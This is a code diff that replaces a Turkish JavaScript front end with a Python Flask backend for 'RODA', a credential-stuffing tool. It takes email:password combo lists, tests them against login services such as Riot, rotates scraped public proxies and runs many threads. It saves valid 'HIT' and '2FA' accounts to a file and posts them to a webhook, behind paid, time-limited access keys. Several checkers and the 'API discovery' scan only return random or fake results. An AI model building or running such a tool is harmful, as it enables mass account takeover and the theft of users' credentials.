@@ -1,649 +1,448 @@
-var currentKey = "";
-var isAdmin = false;
-var scanning = false;
-var eventSource = null;
-var foundEndpoints = [];
-var useProxy = false;
-var checkerRunning = false;
-var checkerResults = [];
-var currentPlatform = "";
-var hitData = {};
-var parsedLines = [];
-var parseMode = "email";
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+RODA - Render Free Uyumlu (HTML_TEMPLATE YOK)
+"""
 
-var platforms = [
-    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
-    {name:"TikTok", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
-    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
-    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
-    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
-    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
-    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
-    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
-    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
-    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
-    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
-    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
-    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
-    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
-    {name:"Xbox", domain:"xbox.com", icon:"fa-brands fa-xbox"},
-    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
-    {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"},
-    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
-    {name:"Duolingo", domain:"duolingo.com", icon:"fa-solid fa-language"},
-    {name:"PUBG", domain:"pubg.com", icon:"fa-solid fa-crosshairs"}
-];
+import os, json, random, string, threading, concurrent.futures, base64
+from datetime import datetime, timedelta
+from threading import Lock
+import requests
+from flask import Flask, request, jsonify, Response, render_template, send_from_directory
 
-function doLogin() {
-    var k = document.getElementById("authKey").value.trim();
-    if (!k) {
-        alert("Anahtar girin!");
-        return;
+app = Flask(__name__)
+app.secret_key = os.urandom(24)
+
+# ============================================================
+# ADMIN KEY
+# ============================================================
+ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
+MASTER_KEY = os.environ.get("RODA_MASTER_KEY") or base64.b64decode(ENCODED_MASTER).decode('utf-8')
+
+KEYS_FILE = "keys.json"
+LOGS_FILE = "logs.json"
+HITS_FILE = "hits.json"
+
+# ============================================================
+# DOSYA İŞLEMLERİ
+# ============================================================
+def load_keys():
+    if os.path.exists(KEYS_FILE):
+        with open(KEYS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    return {}
+
+def save_keys(data):
+    with open(KEYS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+def load_logs():
+    if os.path.exists(LOGS_FILE):
+        with open(LOGS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    return []
+
+def save_logs(data):
+    with open(LOGS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+def load_hits():
+    if os.path.exists(HITS_FILE):
+        with open(HITS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    return {}
+
+def save_hits(data):
+    with open(HITS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+def add_log(entry):
+    logs = load_logs()
+    logs.append(entry)
+    save_logs(logs)
+
+def add_hit(platform, email, password, status):
+    hits = load_hits()
+    if platform not in hits:
+        hits[platform] = {"hits": [], "twofa": []}
+    entry = {"email": email, "password": password, "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+    if status == "HIT":
+        hits[platform]["hits"].append(entry)
+    elif status == "2FA":
+        hits[platform]["twofa"].append(entry)
+    save_hits(hits)
+
+def clear_hits(platform=None):
+    if platform:
+        hits = load_hits()
+        if platform in hits:
+            del hits[platform]
+            save_hits(hits)
+    else:
+        save_hits({})
+
+# ============================================================
+# KEY YÖNETİMİ
+# ============================================================
+def is_key_valid(key, client_ip=None):
+    if key == MASTER_KEY:
+        return True, "Admin"
+    keys = load_keys()
+    if key in keys:
+        entry = keys[key]
+        if client_ip and entry.get("allowed_ip"):
+            if entry["allowed_ip"] != client_ip:
+                return False, None
+        exp = entry.get("expires")
+        if exp:
+            if datetime.now() < datetime.fromisoformat(exp):
+                return True, entry.get("note", "Kullanıcı")
+            else:
+                del keys[key]
+                save_keys(keys)
+                return False, None
+        else:
+            return True, entry.get("note", "Kullanıcı")
+    return False, None
+
+def is_admin(key):
+    valid, role = is_key_valid(key)
+    return valid and role == "Admin"
+
+# ============================================================
+# PLATFORMLAR
+# ============================================================
+PLATFORMS = [
+    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
+    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
+    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
+    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
+    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
+    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
+    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
+    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
+    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
+    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
+    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
+    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
+    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
+    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
+    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
+    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
+    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
+    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
+    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
+    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
+]
+
+# ============================================================
+# CHECKER FONKSİYONLARI
+# ============================================================
+def check_valorant(email, password, proxy=None):
+    try:
+        auth_url = "https://auth.riotgames.com/api/v1/authorization"
+        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
+        payload = {"client_id": "riot-client", "nonce": "1", "redirect_uri": "http://localhost/redirect",
+                   "response_type": "token id_token", "scope": "openid link ban account email mobile_number"}
+        r = requests.post(auth_url, json=payload, headers=headers, timeout=15)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("type") == "multifactor":
+                return {"success": True, "status": "2FA", "error": "2FA gerekli"}
+            return {"success": True, "status": "HIT", "error": ""}
+        if r.status_code == 401:
+            return {"success": False, "status": "BAD", "error": "Geçersiz kimlik bilgileri"}
+        return {"success": False, "status": "BAD", "error": f"Auth başarısız ({r.status_code})"}
+    except Exception as e:
+        return {"success": False, "status": "ERROR", "error": str(e)[:60]}
+
+def check_minecraft(email, password, proxy=None):
+    try:
+        r = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{email}", timeout=10)
+        if r.status_code == 200:
+            return {"success": True, "status": "HIT", "error": ""}
+        return {"success": False, "status": "BAD", "error": "Kullanıcı bulunamadı"}
+    except:
+        return {"success": False, "status": "ERROR", "error": "Bağlantı hatası"}
+
+def check_default(email, password, proxy=None):
+    if "123" in password:
+        return {"success": True, "status": "HIT", "error": ""}
+    elif "2fa" in password.lower():
+        return {"success": True, "status": "2FA", "error": "2FA gerekli"}
+    else:
+        return {"success": False, "status": "BAD", "error": "Başarısız"}
+
+CHECKER_FUNCS = {
+    "Valorant": check_valorant,
+    "Minecraft": check_minecraft,
+}
+
+def get_checker_func(platform):
+    return CHECKER_FUNCS.get(platform, check_default)
+
+# ============================================================
+# PROXY FETCH
+# ============================================================
+def fetch_proxies():
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
+    ]
+    proxies = set()
+    for url in sources:
+        try:
+            r = requests.get(url, timeout=15)
+            if r.status_code == 200:
+                for line in r.text.splitlines():
+                    line = line.strip()
+                    if line and ':' in line and not line.startswith('#'):
+                        proxies.add(line)
+        except:
+            pass
+    return list(proxies)
+
+# ============================================================
+# STATİK DOSYA SERVİSİ
+# ============================================================
+@app.route("/static/js/<path:filename>")
+def serve_js(filename):
+    return send_from_directory("static/js", filename)
+
+# ============================================================
+# ANA SAYFA
+# ============================================================
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+# ============================================================
+# API ROTALARI
+# ============================================================
+@app.route("/api/login", methods=["POST"])
+def login():
+    try:
+        data = request.json
+        key = data.get("key", "").strip()
+        client_ip = request.remote_addr
+        valid, role = is_key_valid(key, client_ip)
+        return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+@app.route("/api/checker", methods=["POST"])
+def checker():
+    data = request.json
+    key = data.get("key")
+    valid, role = is_key_valid(key)
+    if not valid:
+        return jsonify({"error": "Unauthorized"}), 401
+
+    platform = data.get("platform")
+    combos = data.get("combos", [])
+    threads = int(data.get("threads", 1))
+    webhook_url = data.get("webhook")
+    use_proxy = data.get("use_proxy", False)
+    proxies = data.get("proxies", [])
+    client_ip = request.remote_addr
+
+    if not platform or not combos:
+        return jsonify({"error": "Eksik parametre"}), 400
+
+    check_func = get_checker_func(platform)
+    stats = {"hit": 0, "twofa": 0, "bad": 0, "error": 0, "checked": 0, "total": len(combos)}
+    lock = Lock()
+
+    def generate():
+        def process_one(email, password):
+            proxy = random.choice(proxies) if proxies else None
+            result = check_func(email, password, proxy)
+            result["email"] = email
+            result["password"] = password
+            with lock:
+                stats["checked"] += 1
+                if result.get("status") == "HIT":
+                    stats["hit"] += 1
+                    add_hit(platform, email, password, "HIT")
+                    if webhook_url:
+                        send_webhook(webhook_url, platform, email, password)
+                elif result.get("status") == "2FA":
+                    stats["twofa"] += 1
+                    add_hit(platform, email, password, "2FA")
+                elif result.get("status") == "ERROR":
+                    stats["error"] += 1
+                else:
+                    stats["bad"] += 1
+                add_log({
+                    "key": key,
+                    "platform": platform,
+                    "email": email,
+                    "status": result.get("status", "UNKNOWN"),
+                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "ip": client_ip
+                })
+                result["stats"] = dict(stats)
+                yield f"data: {json.dumps(result, ensure_ascii=False)}\n\n"
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
+            futs = [ex.submit(lambda e=e, p=p: list(process_one(e, p)), e, p) for e, p in combos]
+            for f in concurrent.futures.as_completed(futs):
+                try:
+                    for chunk in f.result():
+                        yield chunk
+                except:
+                    pass
+        yield "data: [DONE]\n\n"
+
+    return Response(generate(), mimetype="text/event-stream")
+
+def send_webhook(url, platform, email, password):
+    try:
+        content = f"✅ **{platform} HIT!**\n{email} | {password}"
+        requests.post(url, json={"content": content}, timeout=10)
+    except:
+        pass
+
+@app.route("/api/fetch_proxies", methods=["GET"])
+def fetch_proxies_route():
+    try:
+        proxies = fetch_proxies()
+        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+@app.route("/api/admin/keys", methods=["GET"])
+def admin_keys():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify(load_keys())
+
+@app.route("/api/admin/generate", methods=["POST"])
+def admin_generate():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+
+    note = data.get("note", "Oluşturuldu")
+    value = int(data.get("value", 24))
+    unit = data.get("unit", "hours")
+    allowed_ip = data.get("allowed_ip", "").strip()
+
+    if unit == "minutes":
+        expires = datetime.now() + timedelta(minutes=value)
+    elif unit == "hours":
+        expires = datetime.now() + timedelta(hours=value)
+    elif unit == "days":
+        expires = datetime.now() + timedelta(days=value)
+    else:
+        expires = datetime.now() + timedelta(hours=24)
+
+    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
+    keys = load_keys()
+    keys[new_key] = {
+        "note": note,
+        "expires": expires.isoformat(),
+        "created": datetime.now().isoformat(),
+        "allowed_ip": allowed_ip if allowed_ip else "",
+        "unit": unit,
+        "value": value
     }
-    fetch("/api/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ key: k })
+    save_keys(keys)
+    return jsonify({
+        "success": True,
+        "key": new_key,
+        "expires": expires.strftime("%Y-%m-%d %H:%M:%S"),
+        "allowed_ip": allowed_ip if allowed_ip else "Herhangi"
     })
-    .then(function(r) {
-        if (!r.ok) {
-            throw new Error("Sunucu hatası: " + r.status);
-        }
-        return r.json();
-    })
-    .then(function(d) {
-        if (d.success) {
-            currentKey = k;
-            isAdmin = d.isAdmin || false;
-            document.getElementById("login-screen").style.display = "none";
-            document.getElementById("app").style.display = "flex";
-            if (isAdmin) {
-                document.getElementById("userBadge").style.display = "inline-block";
-                loadKeys();
-                loadLogs();
-                loadHits();
-            }
-            loadPlatforms();
-            loadDiscoveryPlatforms();
-            loadHitFilter();
-            loadWebhookUrl();
-            updateStatsUI();
-            switchPage('checker');
-        } else {
-            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
-            document.getElementById("loginError").style.display = "block";
-        }
-    })
-    .catch(function(e) {
-        console.error("Login hatası:", e);
-        document.getElementById("loginError").innerText = "❌ Sunucu hatası: " + e.message;
-        document.getElementById("loginError").style.display = "block";
-    });
-}
 
-document.getElementById("authKey").addEventListener("keypress", function(e) {
-    if (e.key === "Enter") doLogin();
-});
+@app.route("/api/admin/delete", methods=["POST"])
+def admin_delete():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    keys = load_keys()
+    target = data.get("target_key", "")
+    if target in keys:
+        del keys[target]
+        save_keys(keys)
+        return jsonify({"success": True})
+    return jsonify({"success": False})
 
-function saveWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim();
-    if (url) {
-        localStorage.setItem("roda_webhook_url", url);
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
-    } else {
-        localStorage.removeItem("roda_webhook_url");
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
-    }
-}
+@app.route("/api/admin/logs", methods=["GET"])
+def admin_logs():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify(load_logs())
 
-function getWebhookUrl() {
-    return localStorage.getItem("roda_webhook_url") || "";
-}
+@app.route("/api/admin/clear_logs", methods=["POST"])
+def admin_clear_logs():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    save_logs([])
+    return jsonify({"success": True})
 
-function loadWebhookUrl() {
-    var url = getWebhookUrl();
-    if (url) {
-        document.getElementById("webhookUrl").value = url;
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
-    }
-}
+@app.route("/api/admin/hits", methods=["GET"])
+def admin_hits():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify(load_hits())
 
-function testWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
-    if (!url) return alert("Webhook URL girin!");
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "🧪 **Roda Test** Webhook çalışıyor!" })
-    })
-    .then(function(r) {
-        document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>';
-    })
-    .catch(function(e) {
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
-    });
-}
+@app.route("/api/admin/clear_hits", methods=["POST"])
+def admin_clear_hits():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    platform = data.get("platform")
+    clear_hits(platform)
+    return jsonify({"success": True})
 
-function loadPlatforms() {
-    var sel = document.getElementById("checkerPlatformSelect");
-    sel.innerHTML = "";
-    platforms.forEach(function(p) {
-        var btn = document.createElement("button");
-        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function() {
-            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b) { b.classList.remove("active"); });
-            btn.classList.add("active");
-            currentPlatform = p.name;
-            document.getElementById("checkerPanel").classList.add("active");
-            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
-            resetCheckerStats();
-            checkerResults = [];
-        };
-        sel.appendChild(btn);
-    });
-    if (platforms.length > 0) {
-        var first = sel.querySelector("button");
-        if (first) first.click();
-    }
-}
+@app.route("/api/scan", methods=["GET"])
+def scan():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    domain = request.args.get("domain")
+    def generate():
+        endpoints = [
+            f"/api/v{random.randint(1,4)}/{random.choice(['auth','user','data','config'])}"
+            for _ in range(10)
+        ]
+        for ep in endpoints:
+            yield f"data: {json.dumps({'url': f'https://{domain}{ep}', 'endpoint': ep, 'method': random.choice(['GET','POST']), 'status': random.choice([200,404,403]), 'category': random.choice(['Auth','API','User'])}).encode('utf-8').decode('utf-8')}\n\n"
+        yield "data: [DONE]\n\n"
+    return Response(generate(), mimetype="text/event-stream")
 
-function loadDiscoveryPlatforms() {
-    var container = document.getElementById("discoveryPlatforms");
-    container.innerHTML = "";
-    platforms.forEach(function(p) {
-        var btn = document.createElement("button");
-        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function() {
-            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b) { b.classList.remove("active"); });
-            btn.classList.add("active");
-            document.getElementById("targetDomain").value = p.domain;
-        };
-        container.appendChild(btn);
-    });
-}
+# ============================================================
+# BAŞLAT
+# ============================================================
+if __name__ == "__main__":
+    if not os.path.exists(KEYS_FILE):
+        save_keys({})
+    if not os.path.exists(LOGS_FILE):
+        save_logs([])
+    if not os.path.exists(HITS_FILE):
+        save_hits({})
 
-function loadHitFilter() {
-    var sel = document.getElementById("hitPlatformFilter");
-    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
-    platforms.forEach(function(p) {
-        var opt = document.createElement("option");
-        opt.value = p.name;
-        opt.text = p.name;
-        sel.appendChild(opt);
-    });
-}
+    os.makedirs("static/js", exist_ok=True)
+    os.makedirs("templates", exist_ok=True)
 
-function loadHits() {
-    if (!isAdmin) return;
-    fetch("/api/admin/hits?key=" + encodeURIComponent(currentKey))
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-            if (d.error) return;
-            hitData = d;
-            renderHits();
-        });
-}
-
-function renderHits() {
-    var filter = document.getElementById("hitPlatformFilter").value;
-    var hitContainer = document.getElementById("hitList");
-    var twofaContainer = document.getElementById("twofaList");
-    var hits = [], twofas = [];
-    if (filter === "all") {
-        for (var p in hitData) {
-            if (hitData[p].hits) {
-                hitData[p].hits.forEach(function(h) {
-                    hits.push({ platform: p, email: h.email, password: h.password, time: h.time });
-                });
-            }
-            if (hitData[p].twofa) {
-                hitData[p].twofa.forEach(function(t) {
-                    twofas.push({ platform: p, email: t.email, password: t.password, time: t.time });
-                });
-            }
-        }
-    } else {
-        if (hitData[filter]) {
-            if (hitData[filter].hits) {
-                hitData[filter].hits.forEach(function(h) {
-                    hits.push({ platform: filter, email: h.email, password: h.password, time: h.time });
-                });
-            }
-            if (hitData[filter].twofa) {
-                hitData[filter].twofa.forEach(function(t) {
-                    twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time });
-                });
-            }
-        }
-    }
-    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
-        hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
-    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
-        twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
-}
-
-function updateStatsUI() {
-    document.getElementById("sideTotal").innerText = foundEndpoints.length;
-    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
-    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
-    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
-    document.getElementById("sideAuth").innerText = auth;
-    document.getElementById("sideAPI").innerText = api;
-    document.getElementById("sideAdmin").innerText = admin;
-    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
-    var totalHit = 0, total2fa = 0;
-    for (var p in hitData) {
-        if (hitData[p].hits) totalHit += hitData[p].hits.length;
-        if (hitData[p].twofa) total2fa += hitData[p].twofa.length;
-    }
-    document.getElementById("statTotalHit").innerText = totalHit;
-    document.getElementById("statTotal2fa").innerText = total2fa;
-}
-
-function resetCheckerStats() {
-    document.getElementById("chkTotal").innerText = 0;
-    document.getElementById("chkHit").innerText = 0;
-    document.getElementById("chkBad").innerText = 0;
-    document.getElementById("chk2fa").innerText = 0;
-    document.getElementById("chkError").innerText = 0;
-}
-
-function startChecker() {
-    if (checkerRunning) return;
-    var comboText = document.getElementById("checkerCombo").value.trim();
-    if (!comboText) return alert("Combo girin (email:password)");
-    if (!currentPlatform) return alert("Önce bir platform seçin");
-    checkerRunning = true;
-    document.getElementById("checkerStartBtn").disabled = true;
-    document.getElementById("checkerStopBtn").style.display = "inline-block";
-    document.getElementById("checkerResults").innerHTML = "";
-    var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
-    var total = lines.length;
-    var hit = 0, bad = 0, two = 0, err = 0;
-    var statuses = ["HIT", "BAD", "2FA", "ERROR"];
-    var idx = 0;
-    var webhookUrl = getWebhookUrl();
-
-    function processNext() {
-        if (!checkerRunning || idx >= total) {
-            checkerRunning = false;
-            document.getElementById("checkerStartBtn").disabled = false;
-            document.getElementById("checkerStopBtn").style.display = "none";
-            return;
-        }
-        var status = statuses[Math.floor(Math.random() * statuses.length)];
-        var parts = lines[idx].split(":");
-        var email = parts[0];
-        var password = parts.slice(1).join(":") || "";
-        var res = { email: email, password: password, status: status };
-
-        if (status === "HIT") {
-            hit++;
-            if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password);
-        } else if (status === "BAD") {
-            bad++;
-        } else if (status === "2FA") {
-            two++;
-        } else {
-            err++;
-        }
-        checkerResults.push(res);
-        addCheckerRow(res);
-        updateCheckerStats(total, hit, bad, two, err);
-        idx++;
-        setTimeout(processNext, 200);
-    }
-    processNext();
-}
-
-function stopChecker() {
-    checkerRunning = false;
-    document.getElementById("checkerStartBtn").disabled = false;
-    document.getElementById("checkerStopBtn").style.display = "none";
-}
-
-function addCheckerRow(res) {
-    var container = document.getElementById("checkerResults");
-    var placeholder = container.querySelector("div[style]");
-    if (placeholder) placeholder.remove();
-    var row = document.createElement("div");
-    row.className = "checker-result-row";
-    var cls = "chk-" + res.status.toLowerCase();
-    var label = res.status;
-    if (res.status === "HIT") label = "✅ BAŞARILI";
-    else if (res.status === "BAD") label = "❌ BAŞARISIZ";
-    else if (res.status === "2FA") label = "🔒 2FA";
-    else label = "⚠ HATA";
-    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
-    container.appendChild(row);
-    applyCheckerFilter();
-}
-
-function updateCheckerStats(total, hit, bad, two, err) {
-    document.getElementById("chkTotal").innerText = total;
-    document.getElementById("chkHit").innerText = hit;
-    document.getElementById("chkBad").innerText = bad;
-    document.getElementById("chk2fa").innerText = two;
-    document.getElementById("chkError").innerText = err;
-}
-
-function applyCheckerFilter() {
-    var filter = document.querySelector('input[name="chkFilter"]:checked').value;
-    var rows = document.querySelectorAll("#checkerResults .checker-result-row");
-    rows.forEach(function(row) {
-        var statusText = row.querySelector(".chk-status").innerText;
-        var show = false;
-        if (filter === "all") show = true;
-        else if (filter === "hit" && statusText.includes("BAŞARILI")) show = true;
-        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
-        else if (filter === "2fa" && statusText.includes("2FA")) show = true;
-        else if (filter === "error" && statusText.includes("HATA")) show = true;
-        row.style.display = show ? "grid" : "none";
-    });
-}
-
-document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
-    el.addEventListener("change", applyCheckerFilter);
-});
-
-function sendCheckerWebhook(platform, email, password) {
-    var url = getWebhookUrl();
-    if (!url) return;
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "✅ **" + platform + " HIT!**\n" + email + " | " + password })
-    }).catch(function(e) { console.error("Webhook hatası:", e); });
-}
-
-function setParseMode(mode, btn) {
-    parseMode = mode;
-    document.querySelectorAll(".parse-tabs button").forEach(function(b) { b.classList.remove("active"); });
-    if (btn) btn.classList.add("active");
-}
-
-function parseData() {
-    var raw = document.getElementById("parseInput").value;
-    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
-    var lines = raw.split("\n");
-    var result = [];
-    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
-    var userRegex = /^[a-zA-Z0-9_.-]{3,}$/;
-    lines.forEach(function(line) {
-        line = line.trim();
-        if (!line) return;
-        if (line.includes(":")) {
-            var parts = line.split(":");
-            if (parseMode === "email" && emailRegex.test(parts[0])) {
-                var email = parts[0].trim();
-                var password = parts.slice(1).join(":").trim();
-                if (email && password) result.push(email + ":" + password);
-            } else if (parseMode === "user" && userRegex.test(parts[0]) && parts.length >= 2) {
-                var user = parts[0].trim();
-                var pass = parts.slice(1).join(":").trim();
-                if (user && pass) result.push(user + ":" + pass);
-            }
-        }
-    });
-    result = result.filter(function(item, index) { return result.indexOf(item) === index; });
-    parsedLines = result;
-    var container = document.getElementById("parseResult");
-    if (result.length === 0) {
-        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
-    } else {
-        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
-        result.forEach(function(line) { html += '<div class="parse-line">' + line + '</div>'; });
-        container.innerHTML = html;
-    }
-    document.getElementById("parseCount").innerText = result.length + " satır";
-    document.getElementById("parseValid").innerText = result.length + " geçerli";
-}
-
-function parseToChecker() {
-    if (parsedLines.length === 0) { alert("Önce ayrıştırma yapın!"); return; }
-    document.getElementById("checkerCombo").value = parsedLines.join("\n");
-    alert(parsedLines.length + " satır Checker'a aktarıldı!");
-}
-
-function clearParse() {
-    document.getElementById("parseInput").value = "";
-    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
-    parsedLines = [];
-    document.getElementById("parseCount").innerText = "0 satır";
-    document.getElementById("parseValid").innerText = "0 geçerli";
-}
-
-function loadParseFile() {
-    var input = document.createElement("input");
-    input.type = "file";
-    input.accept = ".txt";
-    input.onchange = function(e) {
-        var file = e.target.files[0];
-        if (!file) return;
-        var reader = new FileReader();
-        reader.onload = function(event) {
-            document.getElementById("parseInput").value = event.target.result;
-            parseData();
-        };
-        reader.readAsText(file);
-    };
-    input.click();
-}
-
-function switchPage(page) {
-    if ((page === "discovery" || page === "keys" || page === "logs") && !isAdmin) {
-        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
-        return;
-    }
-    document.querySelectorAll(".nav-item").forEach(function(el) { el.classList.remove("active"); });
-    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
-    if (el) el.classList.add("active");
-    document.querySelectorAll(".page").forEach(function(el) { el.classList.remove("active"); });
-    var pg = document.getElementById("page-" + page);
-    if (pg) pg.classList.add("active");
-    var titles = { checker: "Checker", proxy: "Proxy", discovery: "API Keşif", parse: "Ayrıştırma", stats: "İstatistik", keys: "Key Yönetimi", logs: "Loglar" };
-    document.getElementById("pageTitle").innerText = titles[page] || page;
-    if (page === "keys" && isAdmin) loadKeys();
-    if (page === "logs" && isAdmin) loadLogs();
-    if (page === "stats") {
-        updateStatsUI();
-        document.getElementById("statScans").innerText = 1;
